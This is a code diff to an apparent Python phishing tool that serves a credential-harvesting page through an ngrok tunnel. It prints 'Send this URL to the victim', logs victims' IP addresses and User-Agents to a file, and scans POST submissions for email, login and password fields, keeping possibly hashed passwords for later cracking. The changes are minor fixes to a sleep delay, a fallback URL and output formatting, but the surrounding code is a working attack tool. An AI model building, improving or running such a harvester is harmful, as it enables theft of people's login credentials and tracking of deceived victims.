@@ -14,6 +14,7 @@ Author: Igor M. Martins
 '''
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from datetime import datetime
+import time
 import subprocess
 from io import BytesIO
 import urllib.request
@@ -37,13 +38,15 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
             print(BLUE+BOLD+"Initializing ngrok reverse proxy"+ENDC)
             os.system(f'ngrok http {port} > /dev/null &')
             os.system('curl --silent http://localhost:4040/api/tunnels > tunnels.json')
+            time.sleep(6)
             tunnel = open('tunnels.json','r')
             data = json.load(tunnel)
             address = data['tunnels'][0]
             print(BOLD+RED+f"\n[+] Send this URL to the victim: {address['public_url']}"+ENDC)
-
+          else:
+            print(BOLD+RED+f"\n[+] Send this URL to the victim: http://0.0.0.0:{port}/"+ENDC)
           while True:
-              print(BLUE+'\n.::Listening on local port %s...\n'%(port)+ENDC)
+              print(BLUE+'\n.:: Listening on local port %s...\n'%(port)+ENDC)
               httpd.serve_forever()
         
         except OSError:
@@ -85,9 +88,9 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
             if not data[0] in self.ips:
               date = self.get_time()
               self.ips.append(data[0])
-              print(BOLD+RED+'[+] IP Found:',data[1]+'\n[+] User-Agent:',data[0],ENDC)
+              print(BOLD+RED+'[+] IP Found: ',data[1]+'\n[+] User-Agent: ',data[0],ENDC)
               file = open('ips.txt','a+')
-              file.write('Date: '+str(date)+' IP: '+str(data[1])+'User-Agent: '+data[0]+'\n')
+              file.write('Date: '+str(date)+' IP: '+str(data[1])+' User-Agent: '+data[0]+'\n')
           else:
             print(BOLD+BLUE+'[-] IP NOT FOUND!'+'\n[+] User-Agent:',data[0],ENDC)
 
@@ -100,7 +103,7 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
         post = unquote(values.decode('utf-8'))
         readpost = post.strip('&')
         if 'enc' in readpost:
-          print(BOLD+GREEN+f"\n[!] Possibly the password went through an encryption algorithm before sending\nSaving file {BLUE}hash.lst{GREEN} for future hash crack\n"+ENDC)
+          print(BOLD+GREEN+f"\n[!] Possibly the password went through an encryption algorithm before sending\nSaving file {BLUE}post.txt{GREEN} for future hash crack\n"+ENDC)
         
         forms = ['email','user','login','pass','encpass'] #Possibles forms to get the credentials
         
